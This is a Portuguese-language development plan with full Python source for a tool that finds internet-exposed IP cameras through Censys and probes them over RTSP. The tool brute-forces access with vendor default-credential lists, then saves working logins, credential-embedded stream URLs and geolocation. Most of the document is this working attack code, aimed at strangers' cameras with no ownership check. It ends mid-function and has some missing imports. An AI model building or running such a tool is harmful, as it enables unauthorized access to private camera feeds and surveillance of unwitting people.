# 05 — FASE 1: CORE ENGINE

> Duração estimada: 2-3 dias
> Objetivo: Motor principal funcional — busca IPs, testa RTSP, tenta creds, guarda resultados

---

## 5.1 Modelos de Dados

### `procurador/core/models.py`

```python
"""
Modelos de dados do Procurador de Câmara.
Todas as entidades partilham estas dataclasses.
"""
from __future__ import annotations
from dataclasses import dataclass, field, asdict
from enum import Enum
from typing import Optional
import json
from datetime import datetime


class CameraStatus(Enum):
    """Estado actual da câmara no pipeline de scan."""
    PENDING = "pending"
    SCANNING = "scanning"
    LIVE = "live"               # Stream acessível!
    AUTH_REQUIRED = "auth"      # RTSP responde mas pede creds
    AUTH_FAILED = "auth_fail"   # Tentámos creds default, sem sucesso
    CLOSED = "closed"           # Porta fechada / timeout
    ERROR = "error"             # Erro genérico
    WEB_ONLY = "web"            # Só HTTP admin, sem RTSP


class SourceType(Enum):
    """Fonte de onde o IP veio."""
    CENSYS = "censys"
    SHODAN = "shodan"
    LOCAL_ARP = "local_arp"
    LOCAL_ONVIF = "local_onvif"
    MANUAL = "manual"


@dataclass
class GeoLocation:
    """Informação de localização geográfica."""
    country: str | None = None
    country_code: str | None = None
    city: str | None = None
    region: str | None = None
    lat: float | None = None
    lon: float | None = None
    postal: str | None = None
    timezone: str | None = None


@dataclass
class NetworkInfo:
    """Informação de rede do dispositivo."""
    isp: str | None = None
    org: str | None = None
    asn: str | None = None
    as_name: str | None = None
    hostname: str | None = None
    domain: str | None = None


@dataclass
class StreamInfo:
    """Informação do stream RTSP."""
    codec: str | None = None          # H.264, H.265, MJPEG
    width: int = 0
    height: int = 0
    fps: float = 0.0
    bitrate_kbps: float | None = None
    pixel_format: str | None = None   # yuv420p, etc
    profile: str | None = None        # High, Main, Baseline


@dataclass
class RTSPProbe:
    """Resultado do probe RTSP."""
    methods: list[str] = field(default_factory=list)
    public_header: str | None = None
    server_header: str | None = None
    sdp_body: str | None = None
    status_code: int = 0
    status_text: str = ""
    response_time_ms: float = 0.0


@dataclass
class Camera:
    """
    Representação completa de uma câmara IP.
    Todos os campos são opcionais — preenchidos incrementalmente.
    """
    # Identificação base
    ip: str
    port: int = 554

    # Descoberta
    source: SourceType = SourceType.CENSYS
    source_query: str = ""
    first_seen: float = 0.0           # timestamp
    last_seen: float = 0.0

    # Fabricante / Modelo
    vendor: str | None = None          # Hikvision, Dahua, Axis, Reolink, etc
    model: str | None = None
    firmware: str | None = None
    mac_address: str | None = None

    # Portas
    ports_open: list[int] = field(default_factory=list)

    # HTTP / Web Admin
    http_status: int | None = None
    http_title: str | None = None
    http_server: str | None = None
    http_url: str | None = None

    # RTSP
    rtsp_probe: RTSPProbe | None = None
    rtsp_path: str | None = None
    rtsp_url: str | None = None       # Com creds embutidas

    # Auth
    auth_required: bool = True
    auth_success: bool = False
    auth_user: str | None = None
    auth_pass: str | None = None
    auth_method: str | None = None    # Basic | Digest

    # Stream
    stream: StreamInfo | None = None
    screenshot_path: str | None = None

    # ONVIF
    onvif_supported: bool = False
    onvif_url: str | None = None
    onvif_profiles: list[str] = field(default_factory=list)
    ptz_supported: bool = False

    # Localização
    geo: GeoLocation = field(default_factory=GeoLocation)
    network: NetworkInfo = field(default_factory=NetworkInfo)

    # Estado
    status: CameraStatus = CameraStatus.PENDING
    error_message: str | None = None
    raw_banner: str | None = None     # Banner RTSP original
    tags: list[str] = field(default_factory=list)

    def to_dict(self) -> dict:
        """Serializar para dicionário (JSON-friendly)."""
        d = asdict(self)
        d['source'] = self.source.value
        d['status'] = self.status.value
        if self.stream:
            d['resolution'] = f"{self.stream.width}x{self.stream.height}"
        return d

    @property
    def resolution(self) -> str:
        if self.stream and self.stream.width > 0:
            return f"{self.stream.width}x{self.stream.height}"
        return "N/A"

    @property
    def country_flag(self) -> str:
        """Devolve flag emoji do país."""
        if not self.geo.country_code:
            return ""
        cc = self.geo.country_code.upper()
        # Converte código para flag emoji
        return chr(ord(cc[0]) + 127397) + chr(ord(cc[1]) + 127397)

    @property
    def location_str(self) -> str:
        """String amigável de localização."""
        parts = []
        if self.geo.city:
            parts.append(self.geo.city)
        if self.geo.country:
            parts.append(f"{self.geo.country} {self.country_flag}")
        return ", ".join(parts) if parts else "Unknown"


@dataclass
class ScanConfig:
    """Configuração de um scan."""
    # Fontes
    censys_enabled: bool = True
    shodan_enabled: bool = False
    local_enabled: bool = True

    # Censys
    censys_query: str = "services.service_name: RTSP"
    censys_country: str = ""
    censys_max_pages: int = 5

    # Scan
    rtsp_probe_timeout: int = 3
    rtsp_probe_concurrent: int = 200
    brute_enabled: bool = True
    brute_threads: int = 50
    stream_capture: bool = True

    # Local
    local_subnet: str = "192.168.1.0/24"
    onvif_discovery: bool = True


@dataclass
class ScanResult:
    """Resultado completo de uma execução de scan."""
    scan_id: str                         # UUID
    config: ScanConfig = field(default_factory=ScanConfig)
    started_at: float = 0.0
    finished_at: float | None = None
    cameras: list[Camera] = field(default_factory=list)

    # Estatísticas (preenchidas no fim)
    total_ips: int = 0
    accessible: int = 0
    auth_required: int = 0
    auth_failed: int = 0
    closed: int = 0
    errors: int = 0
    live_streams: int = 0

    # Estatísticas por fabricante
    vendors: dict[str, int] = field(default_factory=dict)
    countries: dict[str, int] = field(default_factory=dict)

    def calculate_stats(self):
        """Calcular estatísticas finais."""
        self.total_ips = len(self.cameras)
        self.accessible = sum(1 for c in self.cameras if c.status == CameraStatus.LIVE)
        self.auth_required = sum(1 for c in self.cameras if c.status == CameraStatus.AUTH_REQUIRED)
        self.auth_failed = sum(1 for c in self.cameras if c.status == CameraStatus.AUTH_FAILED)
        self.closed = sum(1 for c in self.cameras if c.status == CameraStatus.CLOSED)
        self.errors = sum(1 for c in self.cameras if c.status == CameraStatus.ERROR)
        self.live_streams = sum(1 for c in self.cameras if c.stream and c.stream.width > 0)

        # Contagem por fabricante
        vendor_counts: dict[str, int] = {}
        for c in self.cameras:
            v = c.vendor or "Unknown"
            vendor_counts[v] = vendor_counts.get(v, 0) + 1
        self.vendors = dict(sorted(vendor_counts.items(), key=lambda x: -x[1]))

        # Contagem por país
        country_counts: dict[str, int] = {}
        for c in self.cameras:
            co = c.geo.country or "Unknown"
            country_counts[co] = country_counts.get(co, 0) + 1
        self.countries = dict(sorted(country_counts.items(), key=lambda x: -x[1]))

    def to_json(self, path: str):
        """Exportar para JSON."""
        data = {
            "scan_id": self.scan_id,
            "started_at": datetime.fromtimestamp(self.started_at).isoformat(),
            "finished_at": datetime.fromtimestamp(self.finished_at).isoformat() if self.finished_at else None,
            "config": asdict(self.config),
            "stats": {
                "total_ips": self.total_ips,
                "accessible": self.accessible,
                "auth_required": self.auth_required,
                "auth_failed": self.auth_failed,
                "closed": self.closed,
                "errors": self.errors,
                "live_streams": self.live_streams,
                "vendors": self.vendors,
                "countries": self.countries,
            },
            "cameras": [c.to_dict() for c in self.cameras if c.status in (CameraStatus.LIVE, CameraStatus.AUTH_REQUIRED)],
        }
        with open(path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return path
```

---

## 5.2 Módulo Censys

### `procurador/sources/censys.py`

```python
"""
Integração com Censys API.
Busca dispositivos RTSP, HTTP, ONVIF na base de dados do Censys.
"""
import os
import logging
from typing import Generator

from censys.search import CensysHosts

from procurador.core.models import Camera, CameraStatus, SourceType, ScanConfig

logger = logging.getLogger(__name__)

# Mapeamento de banners para fabricantes
VENDOR_SIGNATURES: dict[str, list[str]] = {
    "Hikvision": ["hikvision", "h264", "h265", "ds-2cd", "ds-2de"],
    "Dahua": ["dahua", "dss", "realmonitor", "general"],
    "Axis": ["axis", "axis-", "vapix", "media.amp"],
    "Reolink": ["reolink", "h264Preview"],
    "TP-Link": ["tp-link", "tapo", "stream1"],
    "Foscam": ["foscam", "videoMain", "videomain"],
    "Bosch": ["bosch", "videoserver"],
    "Hanwha": ["hanwha", "samsung", "media.smp"],
    "Uniview": ["uniview", "unicast"],
    "Amcrest": ["amcrest"],
    "Lorex": ["lorex"],
    "Annke": ["annke"],
    "Swann": ["swann"],
    "Vivotek": ["vivotek", "live.sdp"],
    "GeoVision": ["geovision", "ch001.sdp"],
    "Hipcam": ["hipcam"],
    "Generic RTSP": ["rtsp", "realserver", "rtsp/1.0"],
}


def identify_vendor(banner: str) -> str | None:
    """Identificar fabricante pelo banner RTSP/HTTP."""
    if not banner:
        return None
    banner_lower = banner.lower()

    for vendor, signatures in VENDOR_SIGNATURES.items():
        for sig in signatures:
            if sig in banner_lower:
                return vendor
    return None


def query_builder(country: str = "", query: str = "") -> str:
    """
    Construir query Censys optimizada para câmaras.

    Exemplos:
        "services.service_name: RTSP"
        "services.service_name: RTSP and location.country: Portugal"
        "services.port: 80 and services.http.response.html_title: Hikvision"
    """
    base = query or "services.service_name: RTSP"

    if country:
        # Aceita código (PT) ou nome (Portugal)
        if len(country) == 2:
            base += f" and location.country_code: {country.upper()}"
        else:
            base += f" and location.country: {country}"

    return base


def search_censys(
    config: ScanConfig,
    api_id: str | None = None,
    api_secret: str | None = None,
) -> Generator[Camera, None, None]:
    """
    Buscar câmaras no Censys.

    Yields objetos Camera um a um (lazy loading).
    """
    api_id = api_id or os.environ.get("CENSYS_API_ID")
    api_secret = api_secret or os.environ.get("CENSYS_SECRET")

    if not api_id or not api_secret:
        logger.error("CENSYS_API_ID e CENSYS_SECRET não configurados")
        return

    try:
        c = CensysHosts(api_id=api_id, api_secret=api_secret)
    except Exception as e:
        logger.error(f"Erro ao inicializar CensysHosts: {e}")
        return

    query = query_builder(config.censys_country, config.censys_query)
    logger.info(f"🔍 Censys query: {query}")

    try:
        results = c.search(
            query,
            per_page=config.censys_max_pages * 20,  # 20 por página
            # Note: Censys v2 API usa virtual_hosts="ONLY" para hosts
        )

        count = 0
        for host in results:
            try:
                camera = _parse_censys_host(host)
                if camera:
                    count += 1
                    yield camera
            except Exception as e:
                logger.debug(f"Erro a parsear host: {e}")
                continue

        logger.info(f"✅ Censys: {count} câmaras encontradas")

    except Exception as e:
        logger.error(f"Erro Censys search: {e}")


def _parse_censys_host(host: dict) -> Camera | None:
    """
    Parsear um host do Censys para objeto Camera.

    O formato do Censys v2:
    {
        "ip": "1.2.3.4",
        "location": { "country": "...", "city": "...", ... },
        "services": [
            { "port": 554, "service_name": "RTSP", ... }
        ]
    }
    """
    ip = host.get("ip")
    if not ip:
        return None

    # Location
    loc = host.get("location", {})
    geo_loc = GeoLocation(
        country=loc.get("country"),
        country_code=loc.get("country_code"),
        city=loc.get("city"),
        region=loc.get("region"),
        lat=loc.get("coordinates", {}).get("lat"),
        lon=loc.get("coordinates", {}).get("lng"),
    )

    # Network
    net = host.get("network", {})
    net_info = NetworkInfo(
        isp=net.get("isp"),
        org=net.get("organization"),
        asn=net.get("asn"),
    )

    # Serviços
    services = host.get("services", [])
    ports_found: list[int] = []
    rtsp_service = None
    http_service = None

    for svc in services:
        port = svc.get("port", 0)
        ports_found.append(port)
        name = (svc.get("service_name") or "").lower()

        if name == "rtsp" or port == 554:
            rtsp_service = svc
        elif name in ("http", "https") or port in (80, 443, 8080):
            http_service = svc

    if not rtsp_service:
        # Só criar câmara se tiver serviço RTSP
        return None

    camera = Camera(
        ip=ip,
        port=rtsp_service.get("port", 554),
        source=SourceType.CENSYS,
        first_seen=host.get("first_seen", 0),
        last_seen=host.get("last_seen", 0),
        geo=geo_loc,
        network=net_info,
        ports_open=ports_found,
        status=CameraStatus.PENDING,
    )

    # Banner RTSP
    rtsp_banner = rtsp_service.get("http", {}).get("response", {}).get("body", "") or ""
    rtsp_raw = rtsp_service.get("raw", "")
    camera.raw_banner = rtsp_banner or rtsp_raw

    # Identificar fabricante
    vendor = identify_vendor(camera.raw_banner)
    if vendor:
        camera.vendor = vendor

    # HTTP info
    if http_service:
        http_resp = http_service.get("http", {}).get("response", {})
        camera.http_status = http_resp.get("status_code")
        camera.http_title = (
            http_resp.get("html_title", "") or http_resp.get("title", "")
        )
        http_server = http_service.get("http", {}).get("response", {}).get("headers", {}).get("Server", "")
        camera.http_server = str(http_server) if http_server else None

        # Procurar fabricante também no HTTP
        if not vendor:
            http_body = str(http_resp.get("body", ""))
            vendor = identify_vendor(http_body)
            if vendor:
                camera.vendor = vendor

    # Modelo — extrair de campos específicos
    camera.model = rtsp_service.get("model") or host.get("model")

    return camera
```

---

## 5.3 Motor de Scan RTSP

### `procurador/core/scanner.py`

```python
"""
Motor de scan RTSP.
Probe de sockets TCP + RTSP DESCRIBE para verificar acesso a streams.
"""
import socket
import logging
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Generator

from procurador.core.models import Camera, CameraStatus, RTSPProbe, ScanConfig

logger = logging.getLogger(__name__)

# Paths RTSP comuns por fabricante para tentar
RTSP_PATHS = [
    # Hikvision
    "/Streaming/Channels/101",
    "/Streaming/Channels/102",
    "/h264/ch1/main/av_stream",
    "/h264/ch1/sub/av_stream",
    # Dahua / Amcrest / Lorex
    "/cam/realmonitor?channel=1&subtype=0",
    "/cam/realmonitor?channel=1&subtype=1",
    # Axis
    "/axis-media/media.amp",
    "/axis-media/media.amp?videocodec=h264",
    # TP-Link Tapo
    "/stream1",
    "/stream2",
    # Reolink
    "/h264Preview_01_main",
    "/h264Preview_01_sub",
    # Foscam
    "/videoMain",
    "/videoSub",
    # Genérico
    "/live",
    "/live0",
    "/live1",
    "/live.sdp",
    "/video",
    "/video1",
    "/mpeg4",
    "/h264",
    "/1",
    "/11",
    "/12",
    "/ch1",
    "/ch1/main",
    # Wyze
    "/live",
    # Bosch
    "/video?inst=1&rec=0",
    # Hanwha
    "/profile1/media.smp",
    "/profile2/media.smp",
    # Uniview
    "/unicast/c1/s0/live",
    "/unicast/c1/s1/live",
]


def probe_rtsp(
    ip: str,
    port: int = 554,
    timeout: int = 3,
    path: str = "",
) -> RTSPProbe | None:
    """
    Probe RTSP: connect + OPTIONS + DESCRIBE.

    1. TCP connect (timeout)
    2. Enviar OPTIONS → obter métodos suportados
    3. Enviar DESCRIBE → obter SDP (se acessível)

    Returns RTSPProbe ou None se falhar connect.
    """
    probe = RTSPProbe()
    start = time.time()

    try:
        # 1. TCP Connect
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        probe.response_time_ms = (time.time() - start) * 1000

        # 2. OPTIONS request
        options_req = f"OPTIONS rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\n\r\n"
        sock.send(options_req.encode())
        response = sock.recv(4096).decode("utf-8", errors="ignore")

        # Parse server header
        for line in response.split("\r\n"):
            if line.lower().startswith("server:"):
                probe.server_header = line.split(":", 1)[1].strip()
            if line.lower().startswith("public:"):
                probe.public_header = line.split(":", 1)[1].strip()
                # Extrair métodos
                methods = [m.strip() for m in probe.public_header.split(",")]
                probe.methods = methods

        # Status da resposta
        if response.startswith("RTSP/1.0"):
            try:
                parts = response.split("\r\n")[0].split(" ", 2)
                probe.status_code = int(parts[1])
                probe.status_text = parts[2] if len(parts) > 2 else ""
            except (IndexError, ValueError):
                pass

        # 3. DESCRIBE request (se OPTIONS funcionou)
        if probe.status_code in (200, 401):
            describe_req = f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 2\r\nAccept: application/sdp\r\n\r\n"
            sock.send(describe_req.encode())
            describe_resp = sock.recv(8192).decode("utf-8", errors="ignore")
            probe.sdp_body = describe_resp

            # Parse status do DESCRIBE
            if describe_resp.startswith("RTSP/1.0"):
                try:
                    parts = describe_resp.split("\r\n")[0].split(" ", 2)
                    probe.status_code = int(parts[1])
                    probe.status_text = parts[2] if len(parts) > 2 else ""
                except (IndexError, ValueError):
                    pass

        sock.close()
        return probe

    except socket.timeout:
        logger.debug(f"⏱️  Timeout: {ip}:{port}")
        return None
    except ConnectionRefusedError:
        logger.debug(f"🚫 Refused: {ip}:{port}")
        return None
    except OSError as e:
        logger.debug(f"❌ Socket error {ip}:{port}: {e}")
        return None
    except Exception as e:
        logger.debug(f"❌ Erro inesperado {ip}:{port}: {e}")
        return None


def extract_sdp_info(sdp: str) -> dict:
    """Extrair codec, resolução, fps do SDP."""
    info = {}
    if not sdp:
        return info

    lines = sdp.split("\r\n")
    for i, line in enumerate(lines):
        # Codec (rtpmap)
        if line.startswith("a=rtpmap:"):
            parts = line.split(" ", 1)
            if len(parts) > 1:
                codec_name = parts[1].split("/")[0].lower()
                info["codec"] = codec_name.upper()

        # Resolução (fmtp com frame size)
        if line.startswith("a=fmtp:"):
            if "width" in line.lower() or "height" in line.lower():
                for param in line.split(" "):
                    if "=" in param:
                        k, v = param.split("=", 1)
                        if k.lower() == "width":
                            info["width"] = int(v)
                        elif k.lower() == "height":
                            info["height"] = int(v)

        # FPS no atributo framerate
        if line.startswith("a=framerate:"):
            try:
                info["fps"] = float(line.split(":")[1])
            except ValueError:
                pass

    return info


def scan_camera(camera: Camera, config: ScanConfig) -> Camera:
    """
    Escanear uma câmara: probe RTSP com paths.

    Tenta o path específico se conhecido, senão tenta paths comuns.
    """
    camera.status = CameraStatus.SCANNING
    camera.last_seen = time.time()

    # Tentar paths RTSP
    paths_to_try = [camera.rtsp_path] if camera.rtsp_path else RTSP_PATHS

    for path in paths_to_try:
        result = probe_rtsp(
            camera.ip,
            camera.port,
            config.rtsp_probe_timeout,
            path,
        )

        if result is None:
            continue

        camera.rtsp_probe = result
        camera.raw_banner = camera.raw_banner or result.server_header or ""

        # Identificar fabricante pelo server header
        if not camera.vendor and result.server_header:
            from procurador.sources.censys import identify_vendor
            v = identify_vendor(result.server_header)
            if v:
                camera.vendor = v

        # Status pelo código de resposta
        if result.status_code == 200:
            camera.status = CameraStatus.LIVE
            camera.rtsp_path = path
            camera.auth_required = False

            # Extrair info do SDP
            sdp_info = extract_sdp_info(result.sdp_body or "")
            if sdp_info:
                from procurador.core.models import StreamInfo
                camera.stream = StreamInfo(
                    codec=sdp_info.get("codec"),
                    width=sdp_info.get("width", 0),
                    height=sdp_info.get("height", 0),
                    fps=sdp_info.get("fps", 0.0),
                )

            logger.info(f"✅ LIVE: {camera.ip}:{camera.port}{path}")
            return camera

        elif result.status_code == 401:
            camera.status = CameraStatus.AUTH_REQUIRED
            camera.rtsp_path = path
            camera.auth_required = True
            logger.debug(f"🔒 AUTH: {camera.ip}:{camera.port}{path}")
            return camera

        elif result.status_code == 404:
            # Path não existe, continuar
            continue

        # Outro código
        continue

    # Se não encontrou path válido
    if camera.status == CameraStatus.SCANNING:
        if camera.rtsp_probe and camera.rtsp_probe.server_header:
            # RTSP respondeu mas nenhum path funcionou
            camera.status = CameraStatus.CLOSED
        else:
            camera.status = CameraStatus.CLOSED

    return camera


def scan_batch(
    cameras: list[Camera],
    config: ScanConfig,
    progress_callback=None,
) -> list[Camera]:
    """
    Escanear batch de câmaras em paralelo.

    Usa ThreadPoolExecutor para probes concorrentes.
    """
    results: list[Camera] = []
    max_workers = min(config.rtsp_probe_concurrent, len(cameras))

    logger.info(f"🔍 Scanning {len(cameras)} cameras with {max_workers} threads...")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(scan_camera, cam, config): i
            for i, cam in enumerate(cameras)
        }

        completed = 0
        total = len(cameras)
        for future in as_completed(futures):
            completed += 1
            try:
                result = future.result()
                results.append(result)
            except Exception as e:
                logger.error(f"Erro no scan: {e}")
                # Camera original fica como ERROR
                idx = futures[future]
                cameras[idx].status = CameraStatus.ERROR
                cameras[idx].error_message = str(e)
                results.append(cameras[idx])

            if progress_callback and completed % 10 == 0:
                progress_callback(completed, total)

    logger.info(f"✅ Scan batch: {len(results)} cameras processed")
    return results
```

---

## 5.4 Motor de Brute Force

### `procurador/core/brute.py`

```python
"""
Motor de brute force de credenciais RTSP.
Tenta default credentials por fabricante + wordlist genérica.
"""
import logging
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Generator

from procurador.core.models import Camera, CameraStatus
from procurador.core.scanner import probe_rtsp, RTSP_PATHS

logger = logging.getLogger(__name__)

# Default credentials por fabricante
# Fonte: pesquisa online, documentação oficial, experiência prática
DEFAULT_CREDS: dict[str, list[tuple[str, str]]] = {
    "Hikvision": [
        ("admin", "12345"),
        ("admin", "1234"),
        ("admin", "888888"),
        ("admin", "666666"),
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "123456789"),
        ("admin", "111111"),
        ("admin", "000000"),
    ],
    "Dahua": [
        ("admin", "admin"),
        ("admin", "888888"),
        ("admin", "666666"),
        ("admin", "123456"),
        ("admin", "password"),
        ("admin", "default"),
        ("admin", "12345"),
        ("admin", "1111111"),
    ],
    "Axis": [
        ("root", "pass"),
        ("root", "admin"),
        ("admin", "pass"),
        ("root", "root"),
        ("root", "default"),
    ],
    "TP-Link": [
        ("admin", "admin"),
        ("admin", "1234"),
        ("admin", "password"),
    ],
    "Reolink": [
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "123456"),
        ("admin", "password"),
    ],
    "Foscam": [
        ("admin", ""),
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "12345"),
    ],
    "Bosch": [
        ("admin", "admin"),
        ("admin", "12345"),
        ("root", "root"),
    ],
    "Amcrest": [
        ("admin", "admin"),
        ("admin", "12345"),
    ],
    "Lorex": [
        ("admin", "admin"),
        ("admin", "12345"),
        ("root", "root"),
    ],
    "Hipcam": [
        ("admin", "12345"),
        ("admin", "admin"),
    ],
    "Vivotek": [
        ("root", "root"),
        ("admin", "admin"),
    ],
    "Generic RTSP": [
        ("admin", "admin"),
        ("admin", "12345"),
        ("admin", "password"),
        ("admin", ""),
        ("root", "root"),
        ("root", "pass"),
        ("user", "user"),
        ("user", "password"),
        ("admin", "default"),
        ("admin", "1234"),
    ],
}

# Combinações genéricas (para fabricantes não identificados)
GENERIC_CREDS: list[tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "password"),
    ("admin", ""),
    ("admin", "1234"),
    ("admin", "123456"),
    ("admin", "888888"),
    ("admin", "666666"),
    ("admin", "111111"),
    ("root", "root"),
    ("root", "pass"),
    ("root", "admin"),
    ("user", "user"),
    ("user", "password"),
    ("guest", "guest"),
    ("admin", "default"),
    ("admin", "000000"),
    ("admin", "123456789"),
    ("admin", "server"),
    ("admin", "system"),
]


def get_creds_for_vendor(vendor: str | None) -> list[tuple[str, str]]:
    """Obter lista de credenciais para um fabricante."""
    creds: list[tuple[str, str]] = []

    # Creds específicas do fabricante
    if vendor and vendor in DEFAULT_CREDS:
        creds.extend(DEFAULT_CREDS[vendor])

    # Sempre adicionar genéricas (dedup)
    seen = set(creds)
    for c in GENERIC_CREDS:
        if c not in seen:
            creds.append(c)
            seen.add(c)

    return creds


def try_creds(
    ip: str,
    port: int,
    path: str,
    user: str,
    password: str,
    timeout: int = 3,
) -> int:
    """
    Tentar uma combinação de credenciais RTSP.

    Returns:
        200 = sucesso
        401 = auth recusada
        0 = erro de conexão
    """
    url = f"rtsp://{user}:{password}@{ip}:{port}{path}"

    try:
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))

        # DESCRIBE com auth Basic
        auth_bytes = f"{user}:{password}".encode()
        import base64
        auth_b64 = base64.b64encode(auth_bytes).decode()

        describe_req = (
            f"DESCRIBE {url} RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"Authorization: Basic {auth_b64}\r\n"
            f"Accept: application/sdp\r\n\r\n"
        )
        sock.send(describe_req.encode())
        response = sock.recv(4096).decode("utf-8", errors="ignore")
        sock.close()

        if response.startswith("RTSP/1.0"):
            parts = response.split("\r\n")[0].split(" ", 2)
            return int(parts[1])

    except Exception:
        pass

    return 0


def brute_camera(
    camera: Camera,
    threads: int = 10,
    timeout: int = 3,
) -> Camera:
    """
    Tentar brute force de credenciais numa câmara.

    Se encontrar creds válidas, actualiza camera.auth e status.
    """
    if not camera.rtsp_path:
        logger.debug(f"Sem path RTSP para {camera.ip}")
        return camera

    creds = get_creds_for_vendor(camera.vendor)

    logger.debug(f"🔑 Brute {camera.ip} ({camera.vendor}): {len(creds)} combos")

    # Tentar em paralelo (batch pequeno para evitar flood)
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(
                try_creds,
                camera.ip,
                camera.port,
                camera.rtsp_path,
                user,
                password,
                timeout,
            ): (user, password)
            for user, password in creds
        }

        for future in as_completed(futures):
            try:
                status = future.result()
                user, password = futures[future]

                if status == 200:
                    camera.auth_success = True
                    camera.auth_user = user
                    camera.auth_pass = password
                    camera.status = CameraStatus.LIVE
                    camera.rtsp_url = f"rtsp://{user}:{password}@{camera.ip}:{camera.port}{camera.rtsp_path}"
                    logger.info(f"✅ Creds found for {camera.ip}: {user}:{password}")
                    # Cancelar restantes futures
                    for f in futures:
                        f.cancel()
                    return camera

            except Exception:
                continue

    # Se chegou aqui, nenhuma cred funcionou
    if camera.status == CameraStatus.AUTH_REQUIRED:
        camera.status = CameraStatus.AUTH_FAILED

    return camera


def brute_batch(
    cameras: list[Camera],
    threads: int = 50,
    timeout: int = 3,
    progress_callback=None,
) -> list[Camera]:
    """
    Brute force em batch de câmaras.

    Só processa câmaras com status AUTH_REQUIRED.
    """
    to_brute = [c for c in cameras if c.status == CameraStatus.AUTH_REQUIRED]
    if not to_brute:
        logger.info("🔑 Nenhuma câmara precisa de brute force")
        return cameras

    logger.info(f"🔑 Brute force: {len(to_brute)} targets com {threads} threads...")

    results: list[Camera] = []
    completed = 0
    total = len(to_brute)

    # Processar uma de cada vez (cada uma usa as suas threads internas)
    for cam in to_brute:
        try:
            result = brute_camera(cam, threads=10, timeout=timeout)
            results.append(result)
        except Exception as e:
            logger.error(f"Erro brute {cam.ip}: {e}")
            cam.status = CameraStatus.ERROR
            cam.error_message = str(e)
            results.append(cam)

        completed += 1
        if progress_callback:
            progress_callback(completed, total)

    # Substituir câmaras processadas na lista original
    processed = {c.ip: c for c in results}
    final: list[Camera] = []
    for cam in cameras:
        if cam.ip in processed:
            final.append(processed[cam.ip])
        else:
            final.append(cam)

    return final
```

---

## 5.5 Módulo GeoIP

### `procurador/core/geoip.py`

```python
"""
Resolvedor de GeoIP.
Tenta ipinfo.io API primeiro, fallback para MaxMind DB local.
"""
import logging
import os
import time
from functools import lru_cache

import requests

from procurador.core.models import Camera, GeoLocation, NetworkInfo

logger = logging.getLogger(__name__)


class GeoIPResolver:
    """
    Resolve localização geográfica de IPs.

    Providers:
    1. ipinfo.io API (grátis, 50k req/mês)
    2. ip-api.com (grátis, 45 req/min — não usar para batches)
    3. MaxMind GeoLite2 DB (local, mais rápido)
    """

    def __init__(
        self,
        ipinfo_token: str | None = None,
        maxmind_db_path: str | None = None,
        cache_ttl: int = 3600,
    ):
        self.ipinfo_token = ipinfo_token or os.environ.get("IPINFO_TOKEN", "")
        self.maxmind_db_path = maxmind_db_path
        self.cache_ttl = cache_ttl
        self._cache: dict[str, tuple[float, GeoLocation, NetworkInfo]] = {}

    def resolve(self, ip: str) -> tuple[GeoLocation, NetworkInfo]:
        """
        Resolver localização de um IP.

        Returns: (GeoLocation, NetworkInfo)
        """
        # Cache check
        if ip in self._cache:
            ts, geo, net = self._cache[ip]
            if time.time() - ts < self.cache_ttl:
                return geo, net

        geo, net = self._resolve_ipinfo(ip)

        if geo.country is None and self.maxmind_db_path:
            geo, net = self._resolve_maxmind(ip)

        # Guardar em cache
        self._cache[ip] = (time.time(), geo, net)

        return geo, net

    def _resolve_ipinfo(self, ip: str) -> tuple[GeoLocation, NetworkInfo]:
        """Resolver via ipinfo.io API."""
        geo = GeoLocation()
        net = NetworkInfo()

        if not self.ipinfo_token:
            return geo, net

        try:
            url = f"https://ipinfo.io/{ip}?token={self.ipinfo_token}"
            resp = requests.get(url, timeout=5)
            data = resp.json()

            if resp.status_code == 200:
                geo = GeoLocation(
                    country=data.get("country"),
                    city=data.get("city"),
                    region=data.get("region"),
                    postal=data.get("postal"),
                    timezone=data.get("timezone"),
                )

                # Coordenadas vêm como "lat,lon"
                loc_str = data.get("loc", "")
                if loc_str and "," in loc_str:
                    try:
                        geo.lat = float(loc_str.split(",")[0])
                        geo.lon = float(loc_str.split(",")[1])
                    except ValueError:
                        pass

                net = NetworkInfo(
                    isp=data.get("org", "").split(" ", 1)[-1] if " " in (data.get("org") or "") else data.get("org"),
                    org=data.get("org"),
                    hostname=data.get("hostname"),
                )

            elif resp.status_code == 429:
                logger.warning("⚠️ ipinfo rate limit atingido")

        except requests.exceptions.Timeout:
            logger.debug(f"⏱️ ipinfo timeout: {ip}")
        except Exception as e:
            logger.debug(f"ipinfo error {ip}: {e}")

        return geo, net

    def _resolve_maxmind(self, ip: str) -> tuple[GeoLocation, NetworkInfo]:
        """Resolver via MaxMind GeoLite2 DB local."""
        geo = GeoLocation()
        net = NetworkInfo()

        if not self.maxmind_db_path:
            return geo, net

        try:
            import geoip2.database

            reader = geoip2.database.Reader(self.maxmind_db_path)
            response = reader.city(ip)

            geo = GeoLocation(
                country=response.country.name,
                country_code=response.country.iso_code,
                city=response.city.name,
                region=response.subdivisions.most_specific.name if response.subdivisions else None,
                lat=response.location.latitude,
                lon=response.location.longitude,
                postal=response.postal.code,
                timezone=response.location.time_zone,
            )

            net = NetworkInfo(
                asn=str(response.traits.autonomous_system_number) if response.traits.autonomous_system_number else None,
                as_name=response.traits.autonomous_system_organization,
                org=response.traits.organization,
            )

            reader.close()

        except Exception as e:
            logger.debug(f"MaxMind error {ip}: {e}")

        return geo, net

    def resolve_batch(self, cameras: list[Camera]) -> list[Camera]:
        """Resolver localização para batch de câmaras."""
        for cam in cameras:
            if cam.geo.country is None:
                geo, net = self.resolve(cam.ip)
                cam.geo = geo
